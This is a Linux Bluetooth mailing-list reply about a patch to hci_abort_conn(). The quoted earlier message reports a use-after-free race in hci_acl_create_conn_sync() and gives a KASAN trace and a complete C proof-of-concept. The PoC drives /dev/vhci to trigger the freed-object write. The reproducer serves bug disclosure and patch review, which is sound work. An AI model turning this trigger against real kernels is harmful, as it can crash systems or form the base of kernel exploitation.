Received: from out162-62-57-87.mail.qq.com (out162-62-57-87.mail.qq.com [162.62.57.87])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 473C43EF673
	for <linux-bluetooth@vger.kernel.org>; Mon, 15 Jun 2026 12:46:29 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.87
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781527593; cv=none; b=clyll2YHY79pyvuok2zKxCRQRlwpKjML8gNoF3mXlJ5f3M8plQV7gP2VSnFwyeuAmgngtG1HSu400eWwHXKW+VqW30mYuXCDUtX5OI8Qi5qUc/jK2n5NWlBb2AoaXOqupC2ucyrsVXJm470odK8mp29ZwJoYnKVbKvCjEhICFNI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781527593; c=relaxed/simple;
	bh=0cEx4H1qqDdwdibeiv2Dhwcu3haxcLFQ20Vd8qEhRYg=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=I/HUk/idMcdId0XOwlXJZ1tL5NWaVmLb+N8EcJbdoeUKvChyujV4VcM5+FwGiDIw8r9KmnrptwxbTvaoqiEjmsqdJqEbD+9IckIfl43zPqVJGAjDUKisY8OAMsE8xke7FCK7Vo3l2LIavGHyhCEqKV08Z9R3aUazCjlX1RUzOkg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=K/4VQSTU; arc=none smtp.client-ip=162.62.57.87
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="K/4VQSTU"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1781527581; bh=1UNhbZYUVzlBYjnFCWdFnO/9w0KhsC9ljQ8oKV+Pi9k=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=K/4VQSTUmSa/abUPire6oWcuql5hZQoYN6Ki+fzBh4/nKxgN3hpVtH01AubzZlOr+
	 ZCISqn1J8Bg2VoVrnVlLk+S03IQovnZW8lVdLZHy9R839SKjTz67yo3hEh8CXytitU
	 oTdIwvIBzzGKfltAcAnMRtqiBEGOFW8vI8z0OAWA=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrszc56-0.qq.com (NewEsmtp) with SMTP
	id B4A0E2C7; Mon, 15 Jun 2026 20:45:10 +0800
X-QQ-mid: xmsmtpt1781527510tccz6uil7
Message-ID: <tencent_6FEEAFF111E5B0EC85D73E1901590BF10B05@qq.com>
X-QQ-XMAILINFO: MeukCuWaRbQlBDtRz0wrIejCXAW45lc28/Iq6s+L4j5BJjQzCHUIL0xDHP2MZB
	 fWEIdf44SCjNc4vQ2khfa8ER+30MEHDDJfoaPH/gtoGVPj0f1v2N4fLiqPCYShndOjwObK1Qd79Y
	 goZNQFTFEVsV1iWJ3bHI16+Uk1OEkVwK99KbDVGm3ktgDgDuTYDpKm0iqpSRdSEpWHThyOtVqbEV
	 NAfBH8lx7vguFOYd8KqPacAtnkPFAVB1TXz7eLGcU4C17mjC3yDHi5CPJ1n9sbpADbOGVpGiJWcS
	 AsG+/j3qEU3r2/h/GR3osmMyCbj1DmKMh1nROUkrgBtWrLBy2EEbUeSB3bb7PgJN5mWQBSa4R0da
	 UKaucwZCgMlDcqHXVyGg1XtItDz/txEyQLCfUK+DTp+qROGHpWQ377oGw7ka40EmI2BPWypPUwzw
	 m8XKiSPMNqKjyjSibkreP1B2p91uMGAW5H+rm/cUgpUcm2sp34bbx7klFgLsnM0ZYYqRUFvcS5oc
	 Df8vs+VObHTifrmPLJO48JNu4ftqZNPpV8ZFGbOuMIjZQiPi0zPVuG4jj9Wx9obGHuk/VzNSpVdl
	 1J+qhcUK7jmApFxzFtdjT/96amdIAsoPvloV2Lbqx8kotg1mD8vzcDar/uKbyClg2ewmccuTY/mZ
	 iouauFveK8smlSnmSz6NjMjQVFl2evq8Qe0TO/Qlr2WzBgyPKgBt9iCo8GEXc9iprzOCkReytYAb
	 zdi4mC24JtJiWpVqMzPuH6oJ4y2//lLo4/V3wIBwcKIBBhZUfsGhDTwQ4i3B/bm+cY33F+SU/5fE
	 X+KwjlbBdbU1k5Wn6bkaIKIxmrqBqxsB3073D1Tw6dK/X390NyhNu1udMG46IXi4F/BJOFwyodrX
	 awasGcMZ5pUgyFY6WxlZ4juhsdaVfWwqOMwsO90RLpQjOifa9loqHZ54YJZzFIO+c3E8KjoCc0ZI
	 jG8c4nYjJoEgIy4N8muTxQ5CRX6BlhamChBDMede7CyOUWe09GXNLTdj0yPK9kZgwCVNJa+OLkBM
	 GLuk1E1uz4VclCMFxa3cEKUph/VqMZqcp/+g6ESAVJQuuipPz/kJqCoI8z979gZ1ioVCz+i0UvFZ
	 zx/6yO2iCLtoar5Xw=
X-QQ-XMRINFO: NyFYKkN4Ny6FuXrnB5Ye7Aabb3ujjtK+gg==
X-OQ-MSGID: <5449ce90-6538-48ba-8656-b413d140c285@qq.com>
Date: Mon, 15 Jun 2026 20:45:09 +0800
Precedence: bulk
X-Mailing-List: linux-bluetooth@vger.kernel.org
List-Id: <linux-bluetooth.vger.kernel.org>
List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v3] Bluetooth: hci_conn: Fix null ptr deref in
 hci_abort_conn()
To: Siwei Zhang <oss@fourdim.xyz>,
 Luiz Augusto von Dentz <luiz.dentz@gmail.com>
Cc: linux-bluetooth@vger.kernel.org
References: <20260611152039.2176565-1-oss@fourdim.xyz>
 <tencent_CB641244263894463F94A2B27D5E9BE43D07@qq.com>
 <bed30255-ccf4-4f84-a19d-557bd8bdeeb0@app.fastmail.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <bed30255-ccf4-4f84-a19d-557bd8bdeeb0@app.fastmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi Siwei,

Thanks for your reply and I’m glad my feedback was helpful. You 
definitely have my permission to add the "Suggested-by" tag.


Best,
XIAO WU

在 15/6/26 下午8:38, Siwei Zhang 写道:
> Hi Xiao Wu,
> 
> On Sat, Jun 13, 2026, at 6:40 AM, XIAO WU wrote:
>> Hi Siwei,
>>
>> On Thu, 11 Jun 2026 11:19:52 -0400, Siwei Zhang wrote:
>>   > Bluetooth: hci_conn: Fix null ptr deref in hci_abort_conn()
>>
>> This patch correctly fixes the NULL dereference in hci_abort_conn() by
>> tracking in-flight create commands with HCI_CONN_CREATE.
>>
>> I noticed a Sashiko review[1] of this patch flagged that the new
>> clear_bit(HCI_CONN_CREATE, &conn->flags) calls after
>> __hci_cmd_sync_status_sk() introduce a use-after-free.  I wrote a PoC
>> to verify this and was able to trigger it reliably on a KASAN-enabled
>> kernel.
>>
>> The race:
>>
>>     If the controller rejects the ACL connection attempt (e.g. via
>>     Command Status with a non-zero status), the RX thread processes the
>>     rejection in hci_cs_create_conn() → hci_conn_del(), freeing the
>>     hci_conn object.  Shortly after, __hci_cmd_sync_status_sk() returns
>>     the error to hci_acl_create_conn_sync() on the hci_cmd_sync_work
>>     worker, which then writes to the freed conn via clear_bit().
>>
>> My PoC opens /dev/vhci, creates a virtual controller that responds to
>> HCI_OP_CREATE_CONN with Command Status error 0x2e, powers on the
>> controller, and triggers an L2CAP connect.  This reliably hits:
>>
>> ==================================================================
>> BUG: KASAN: slab-use-after-free in hci_acl_create_conn_sync+0x3c6/0x600
>> Write of size 8 at addr ffff88802eed2950 by task kworker/u11:0/57
>> Workqueue: hci0 hci_cmd_sync_work
>>
>> Call Trace:
>>    <TASK>
>>    dump_stack_lvl+0x116/0x1f0
>>    print_report+0xf4/0x600
>>    kasan_report+0xe0/0x110
>>    kasan_check_range+0x100/0x1b0
>>    hci_acl_create_conn_sync+0x3c6/0x600    <-- clear_bit on freed conn
>>    hci_cmd_sync_work+0x1b0/0x480
>>    process_one_work+0xa20/0x1c50
>>    worker_thread+0x6df/0xf30
>>    kthread+0x387/0x4a0
>>
>> Allocated by task 9349 (L2CAP connect):
>>    __hci_conn_add+0xfd/0x1df0
>>    hci_conn_add_unset+0x7b/0x130
>>    hci_connect_acl+0x4aa/0x7c0
>>    l2cap_chan_connect+0x779/0x2160
>>    l2cap_sock_connect+0x381/0x7a0
>>
>> Freed by task 9353 (RX thread):
>>    kfree+0x171/0x720
>>    device_release+0xd7/0x280
>>    hci_conn_del_sysfs+0x17b/0x1a0
>>    hci_conn_del+0x685/0x11d0
>>    hci_cs_create_conn+0x1e9/0x430     <-- controller rejection
>>    hci_cmd_status_evt+0x267/0x790
>>    hci_event_packet+0x521/0xce0
>>    hci_rx_work+0x2ce/0x1030
>> ==================================================================
>>
>> The race window:
>>
>>     hci_acl_create_conn_sync()           hci_rx_work()
>>     ==========================           ==============
>>     __hci_cmd_sync_status_sk(...)        hci_cs_create_conn()
>>       → waiting for controller reply       → hci_conn_del()
>>                                            → kfree(conn)
>>     clear_bit(HCI_CONN_CREATE,
>>       &conn->flags);  ← UAF
>>
>> The same pattern exists in hci_le_create_conn_sync().
>>
>> One possible fix: take a reference on conn before the cmd_sync call
>> and drop it after clear_bit(), or move the clear_bit to a point where
>> the conn is still guaranteed to be alive.  The Sashiko review[1]
>> points out a few other issues in the same patch as well.
>>
>> I wrote the following PoC.  It opens /dev/vhci, emulates a controller
>> that rejects CREATE_CONN, powers up via MGMT, and triggers an L2CAP
>> connect to exercise the race.
>>
>> ---8<--- poc.c ---
>> /*
>>    * PoC for UAF in hci_acl_create_conn_sync()
>>    *
>>    * Opens /dev/vhci, creates a virtual HCI controller that responds to
>>    * HCI_OP_CREATE_CONN with Command Status 0x2e
>> (HCI_ERROR_COMMAND_DISALLOWED).
>>    * The RX thread processes this via hci_cs_create_conn() and frees the
>> conn,
>>    * while the hci_cmd_sync_work worker then hits the UAF in clear_bit().
>>    *
>>    * Build:  gcc -Wall -O2 -o poc poc.c -lpthread
>>    * Run:    ./poc   (root, KASAN-enabled kernel, vhci loaded)
>>    */
>> #define _GNU_SOURCE
>> #include <stdio.h>
>> #include <stdlib.h>
>> #include <string.h>
>> #include <unistd.h>
>> #include <fcntl.h>
>> #include <errno.h>
>> #include <sys/socket.h>
>> #include <sys/poll.h>
>> #include <pthread.h>
>> #include <stdint.h>
>>
>> #define HCI_COMMAND_PKT 0x01
>> #define HCI_EVENT_PKT    0x04
>> #define HCI_VENDOR_PKT   0xff
>> #define HCI_EV_CMD_COMPLETE 0x0e
>> #define HCI_EV_CMD_STATUS   0x0f
>> #define HCI_OP_CREATE_CONN  0x0405
>> #define HCI_OP_RESET        0x0c03
>> #define BTPROTO_L2CAP   0
>> #define BTPROTO_HCI     1
>> #define BDADDR_BREDR    0x00
>> #define HCI_CHANNEL_CONTROL 3
>>
>> struct sockaddr_l2 {
>>       uint16_t l2_family, l2_psm;
>>       uint8_t  l2_bdaddr[6];
>>       uint16_t l2_cid;
>>       uint8_t  l2_bdaddr_type;
>> } __attribute__((packed));
>>
>> struct sockaddr_hci {
>>       uint16_t hci_family, hci_dev, hci_channel;
>> };
>>
>> static volatile int vhci_fd = -1;
>> static volatile int saw_conn = 0;
>>
>> static int send_evt(uint8_t e, const void *d, uint8_t dl)
>> {
>>       uint8_t b[512];
>>       b[0] = HCI_EVENT_PKT; b[1] = e; b[2] = dl;
>>       if (dl && d) memcpy(b + 3, d, dl);
>>       return write(vhci_fd, b, 3 + dl);
>> }
>>
>> static int read_cmd(uint16_t *o, uint8_t *p, int *pl, int tmo)
>> {
>>       uint8_t b[8192];
>>       struct pollfd pf = {.fd = vhci_fd, .events = POLLIN};
>>       int r = poll(&pf, 1, tmo);
>>       if (r <= 0) return -1;
>>       r = read(vhci_fd, b, sizeof(b));
>>       if (r < 4 || b[0] != HCI_COMMAND_PKT) return -1;
>>       *o = b[1] | (b[2] << 8); *pl = b[3];
>>       if (p && *pl) memcpy(p, b + 4, (*pl < r - 4) ? *pl : r - 4);
>>       return 1;
>> }
>>
>> static void send_ok(uint16_t o) { uint8_t r[1] = {0};
>> send_evt(HCI_EV_CMD_COMPLETE, r, 1); }
>> static void send_cc(uint16_t o, const void *rd, uint8_t rl) {
>> send_evt(HCI_EV_CMD_COMPLETE, rd, rl); }
>> static void send_cs(uint16_t o, uint8_t s) {
>>       uint8_t p[4] = {s, 1, o & 0xff, (o >> 8) & 0xff};
>>       send_evt(HCI_EV_CMD_STATUS, p, 4);
>> }
>>
>> static void *init_thr(void *a)
>> {
>>       (void)a;
>>       uint16_t o; uint8_t p[256]; int pl;
>>       while (1) {
>>           if (read_cmd(&o, p, &pl, 2000) < 0) { usleep(50000); continue; }
>>           if (o == HCI_OP_CREATE_CONN) {
>>               /* Reject with Command Status error 0x2e */
>>               send_cs(o, 0x2e);
>>               saw_conn = 1;
>>               continue;
>>           }
>>           if (o == HCI_OP_RESET) { send_ok(o); continue; }
>>           /* ... handle many other HCI commands for init ... */
>>           send_ok(o);
>>       }
>>       return 0;
>> }
>>
>> struct mgmt_hdr { uint16_t opcode, index, len; } __attribute__((packed));
>> #define MGMT_OP_SET_POWERED     0x0005
>> #define MGMT_OP_SET_CONNECTABLE 0x000b
>>
>> int main(void)
>> {
>>       printf("[*] open vhci\n");
>>       vhci_fd = open("/dev/vhci", O_RDWR);
>>       if (vhci_fd < 0) { perror("vhci"); return 1; }
>>       uint8_t c[2] = {HCI_VENDOR_PKT, 0}; write(vhci_fd, c, 2);
>>
>>       printf("[*] start vhci init thread\n");
>>       pthread_t t; pthread_create(&t, 0, init_thr, 0);
>>       sleep(6);
>>
>>       /* Power on via MGMT */
>>       int mgmt = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
>>       if (mgmt >= 0) {
>>           struct sockaddr_hci ha = {AF_BLUETOOTH, 0xffff,
>> HCI_CHANNEL_CONTROL};
>>           if (bind(mgmt, (struct sockaddr *)&ha, sizeof(ha)) == 0) {
>>               uint8_t cmd[256];
>>               struct mgmt_hdr *hdr = (struct mgmt_hdr *)cmd;
>>               hdr->opcode = MGMT_OP_SET_POWERED; hdr->index = 0; hdr->len
>> = 1;
>>               cmd[sizeof(*hdr)] = 1;
>>               write(mgmt, cmd, sizeof(*hdr) + 1);
>>               usleep(200000);
>>               hdr->opcode = MGMT_OP_SET_CONNECTABLE;
>>               write(mgmt, cmd, sizeof(*hdr) + 1);
>>               usleep(200000);
>>           }
>>           close(mgmt);
>>       }
>>
>>       /* L2CAP connect triggers hci_connect_acl → hci_acl_create_conn_sync */
>>       printf("[*] L2CAP connect (trigger)\n");
>>       int l2 = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
>>       if (l2 >= 0) {
>>           struct sockaddr_l2 ba; memset(&ba, 0, sizeof(ba));
>>           ba.l2_family = AF_BLUETOOTH; ba.l2_bdaddr_type = BDADDR_BREDR;
>>           bind(l2, (struct sockaddr *)&ba, sizeof(ba));
>>           struct sockaddr_l2 ca; memset(&ca, 0, sizeof(ca));
>>           ca.l2_family = AF_BLUETOOTH; ca.l2_psm = 1;
>>           ca.l2_bdaddr_type = BDADDR_BREDR;
>>           memset(ca.l2_bdaddr, 0x11, 6);
>>           connect(l2, (struct sockaddr *)&ca, sizeof(ca));
>>           close(l2);
>>       }
>>       usleep(500000);
>>       pthread_cancel(t); pthread_join(t, 0); close(vhci_fd);
>>       printf("[*] done. Check dmesg for KASAN slab-use-after-free.\n");
>>       return 0;
>> }
>> ---8<---
>>
>> Hope this helps with the patch.  Let me know if you need additional
>> information from the test setup.
>>
>> [1]
>> https://sashiko.dev/#/patchset/20260611152039.2176565-1-oss%40fourdim.xyz
> 
> Thanks for your review. I will send a new patch to fix this.
> I would like to add a suggested by if i have your permission.
> 
> Best,
> Siwei


